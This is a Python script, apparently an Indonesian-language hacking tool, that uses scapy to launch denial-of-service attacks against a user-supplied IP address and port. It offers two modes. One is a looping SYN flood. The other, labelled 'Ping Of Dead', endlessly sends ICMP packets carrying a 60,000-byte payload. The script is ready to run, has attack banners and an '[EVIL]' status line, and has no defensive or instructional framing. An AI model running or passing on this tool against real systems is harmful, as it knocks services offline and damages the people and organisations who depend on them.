from scapy.all import *
from colorama import Fore
import argparse 
from threading import Thread


print (Fore.LIGHTGREEN_EX,f'''
8888888b.          .d8888b. 8888888888                             
888  "Y88b        d88P  Y88b888                                    
888    888        Y88b.     888                                    
888    888 .d88b.  "Y888b.  8888888 .d88b. 888d888 .d8888b .d88b.  
888    888d88""88b    "Y88b.888    d88""88b888P"  d88P"   d8P  Y8b 
888    888888  888      "888888    888  888888    888     88888888 
888  .d88PY88..88PY88b  d88P888    Y88..88P888    Y88b.   Y8b.     
8888888P"  "Y88P"  "Y8888P" 888     "Y88P" 888     "Y8888P "Y8888  

{Fore.LIGHTRED_EX}[ICMP] {Fore.LIGHTGREEN_EX} : Ping Of Dead
{Fore.LIGHTRED_EX}[SYN]  {Fore.LIGHTGREEN_EX} : Syn FLood

''')
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', required=True, help="Masukan IP address target")
parser.add_argument('-p','--port', required=False, default=80, help="Masukan port target")
parser.add_argument('-m','--mode', required=True, help="mode :icmp and syn")
args = parser.parse_args()

      
def dos():
        print (Fore.LIGHTGREEN_EX,f'''
.d8888. db    db d8b   db d88888b db       .d88b.   .d88b.  d8888b. 
88'  YP `8b  d8' 888o  88 88'     88      .8P  Y8. .8P  Y8. 88  `8D 
`8bo.    `8bd8'  88V8o 88 88ooo   88      88    88 88    88 88   88 
  `Y8b.    88    88 V8o88 88~~~   88      88    88 88    88 88   88 
db   8D    88    88  V888 88      88booo. `8b  d8' `8b  d8' 88  .8D 
`8888Y'    YP    VP   V8P YP      Y88888P  `Y88P'   `Y88P'  Y8888D' 

Start attack...

[+] IP ADDRESS : {args.target}
[+] PORT       : {args.port}
''')
        syn_packet = IP(dst=args.target) / TCP(dport=args.port, flags="S")
        print (f'{Fore.LIGHTRED_EX}[EVIL]{Fore.GREEN} SEND SYN FLOOD TO {Fore.LIGHTRED_EX}[{args.target}] {Fore.LIGHTGREEN_EX}PORT {Fore.LIGHTRED_EX}[{args.port}]')
        send(syn_packet, verbose=0,loop=1)

def pod():
    print (Fore.LIGHTGREEN_EX,f'''
    d8888b. d888888b d8b   db  d888b   .d88b.  d88888b d8888b. d88888b  .d8b.  d8888b. 
    88  `8D   `88'   888o  88 88' Y8b .8P  Y8. 88'     88  `8D 88'     d8' `8b 88  `8D 
    88oodD'    88    88V8o 88 88      88    88 88ooo   88   88 88ooooo 88ooo88 88   88 
    88~~~      88    88 V8o88 88  ooo 88    88 88~~~   88   88 88~~~~~ 88~~~88 88   88 
    88        .88.   88  V888 88. ~8~ `8b  d8' 88      88  .8D 88.     88   88 88  .8D 
    88      Y888888P VP   V8P  Y888P   `Y88P'  YP      Y8888D' Y88888P YP   YP Y8888D'
    
    Start attack...

    [+] IP ADDRESS : {args.target}
    [+] PORT       : {args.port}
    ''')
    MESSAGE="T"
    pingOFDeath = IP(dst=args.target)/ICMP()/(MESSAGE*60000)
    send(pingOFDeath, loop=1, verbose=1)

if args.mode =="syn":
      dos()
elif args.mode =="icmp":
      pod()